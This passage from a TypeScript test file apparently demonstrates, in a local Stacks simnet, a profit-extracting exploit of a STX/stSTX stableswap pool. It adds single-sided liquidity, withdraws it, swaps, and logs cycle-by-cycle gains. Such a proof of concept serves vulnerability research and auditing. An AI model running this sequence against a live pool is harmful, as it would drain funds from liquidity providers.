            console.log(`Final value: ${formatUSD(value1)}`);
            console.log(`Profit: ${formatUSD(value1 - EXPLOIT_AMOUNT)}`);
            console.log(`Return: ${((value1 / EXPLOIT_AMOUNT - 1) * 100).toFixed(2)}%`);

            // Approach 2: Add/Remove + Swap
            console.log("\n2. Add/Remove + Swap Approach");
            const addLiqResult2 = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "add-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(EXPLOIT_AMOUNT),
                    Cl.uint(0),
                    Cl.uint(1)
                ],
                deployer
            );
            const lpTokens2 = Number(cvToJSON(addLiqResult2.result).value.value);

            const removeLiqResult2 = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "withdraw-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(lpTokens2),
                    Cl.uint(1),
                    Cl.uint(1)
                ],
                deployer
            );
            const withdraw2 = cvToJSON(removeLiqResult2.result).value.value;
            const initialSTX2 = Number(withdraw2['x-amount'].value);
            const initialStSTX2 = Number(withdraw2['y-amount'].value);

            // Swap stSTX to STX
            const swapResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "swap-y-for-x",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(initialStSTX2),
                    Cl.uint(1)
                ],
                deployer
            );
            const swapOutput = Number(cvToJSON(swapResult.result).value.value);
            const finalSTX2 = initialSTX2 + swapOutput;

            console.log(`Initial: ${EXPLOIT_AMOUNT} STX (${formatUSD(EXPLOIT_AMOUNT)})`);
            console.log(`After withdrawal: ${initialSTX2} STX + ${initialStSTX2} stSTX`);
            console.log(`After swap: ${finalSTX2} STX`);
            console.log(`Final value: ${formatUSD(finalSTX2)}`);
            console.log(`Profit: ${formatUSD(finalSTX2 - EXPLOIT_AMOUNT)}`);
            console.log(`Return: ${((finalSTX2 / EXPLOIT_AMOUNT - 1) * 100).toFixed(2)}%`);

            console.log("\n=== Analysis ===");
            console.log("Simple approach advantages:");
            console.log("- No trading fees");
            console.log("- No price impact from swaps");
            console.log("- Keeps valuable stSTX position");

            console.log("\nCompounding approach disadvantages:");
            console.log("- Pays trading fees on each swap");
            console.log("- Suffers price impact when swapping");
            console.log("- Loses premium value of stSTX position");
        });
    });

    describe("2.8 External Market Compound Exploit", () => {
        const INITIAL_BALANCE = 100000000; // 100M tokens
        const EXPLOIT_AMOUNT = 1000000; // 1M tokens
        const STX_PRICE_USD = 1.00;
        const STSTX_PRICE_USD = 1.10;
        const CYCLES = 5;
        const EXTERNAL_EXCHANGE_RATIO = 1.1; // Get 1.1 STX per stSTX on external market

        const formatUSD = (amount: number) => `$${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

        beforeEach(async () => {
            // Mint stSTX tokens to deployer
            simnet.callPublicFn(
                "token-ststx",
                "mint",
                [
                    Cl.uint(INITIAL_BALANCE),
                    Cl.principal(deployer)
                ],
                deployer
            );
        });

        it(`demonstrates compound exploit with external swaps over ${CYCLES} cycles`, () => {
            console.log("\n=== Starting Compound Exploit with External Swaps ===");
            console.log(`STX Price: ${formatUSD(STX_PRICE_USD)}`);
            console.log(`stSTX Price: ${formatUSD(STSTX_PRICE_USD)}`);
            console.log(`External Exchange Rate: 1 stSTX = ${EXTERNAL_EXCHANGE_RATIO} STX`);
            console.log(`Initial STX: ${EXPLOIT_AMOUNT}`);

            let currentSTXBalance = EXPLOIT_AMOUNT;
            let totalProfit = 0;
            let totalVolume = 0;

            for (let cycle = 1; cycle <= CYCLES; cycle++) {
                console.log(`\n=== Cycle ${cycle} ===`);
                console.log(`Starting with ${currentSTXBalance} STX`);
                totalVolume += currentSTXBalance;

                // Step 1: Add single-sided liquidity
                const addLiqResult = simnet.callPublicFn(
                    "stableswap-core-v-1-1",
                    "add-liquidity",
                    [
                        Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                        Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                        Cl.contractPrincipal(deployer, "token-ststx"),
                        Cl.uint(currentSTXBalance),
                        Cl.uint(0),
                        Cl.uint(1)
                    ],
                    deployer
                );
                const lpTokensReceived = Number(cvToJSON(addLiqResult.result).value.value);

                // Step 2: Remove liquidity
                const removeLiqResult = simnet.callPublicFn(
                    "stableswap-core-v-1-1",
                    "withdraw-liquidity",
                    [
                        Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                        Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                        Cl.contractPrincipal(deployer, "token-ststx"),
                        Cl.uint(lpTokensReceived),
                        Cl.uint(1),
                        Cl.uint(1)
                    ],
                    deployer
                );
                const withdrawAmount = cvToJSON(removeLiqResult.result).value.value;
                const receivedSTX = Number(withdrawAmount['x-amount'].value);
                const receivedStSTX = Number(withdrawAmount['y-amount'].value);

                // Step 3: Simulate external market swap at 1.1x ratio
                const externalSwapSTX = Math.floor(receivedStSTX * EXTERNAL_EXCHANGE_RATIO);
                currentSTXBalance = receivedSTX + externalSwapSTX;

                // Calculate cycle profit
                const cycleProfit = currentSTXBalance - (cycle === 1 ? EXPLOIT_AMOUNT : (totalProfit + EXPLOIT_AMOUNT));
                totalProfit += cycleProfit;

                console.log(`\nCycle ${cycle} Results:`);
                console.log(`Received from pool:`);
                console.log(`- STX: ${receivedSTX}`);
                console.log(`- stSTX: ${receivedStSTX}`);
                console.log(`External swap: ${receivedStSTX} stSTX → ${externalSwapSTX} STX`);
                console.log(`New STX balance: ${currentSTXBalance}`);
                console.log(`Cycle profit: ${cycleProfit} STX (${formatUSD(cycleProfit * STX_PRICE_USD)})`);
                console.log(`Cycle return: ${((cycleProfit / (currentSTXBalance - cycleProfit)) * 100).toFixed(2)}%`);
            }

            console.log("\n=== Final Compound Exploit Summary ===");
            console.log(`Initial investment: ${EXPLOIT_AMOUNT} STX (${formatUSD(EXPLOIT_AMOUNT * STX_PRICE_USD)})`);
            console.log(`Final balance: ${currentSTXBalance} STX (${formatUSD(currentSTXBalance * STX_PRICE_USD)})`);
            console.log(`Total profit: ${totalProfit} STX (${formatUSD(totalProfit * STX_PRICE_USD)})`);
            console.log(`Total return: ${((totalProfit / EXPLOIT_AMOUNT) * 100).toFixed(2)}%`);
            console.log(`Average profit per cycle: ${(totalProfit / CYCLES)} STX (${formatUSD((totalProfit / CYCLES) * STX_PRICE_USD)})`);
            console.log(`Total volume: ${totalVolume} STX (${formatUSD(totalVolume * STX_PRICE_USD)})`);
            console.log(`Profit per volume: ${((totalProfit / totalVolume) * 100).toFixed(2)}%`);
        });
    });
});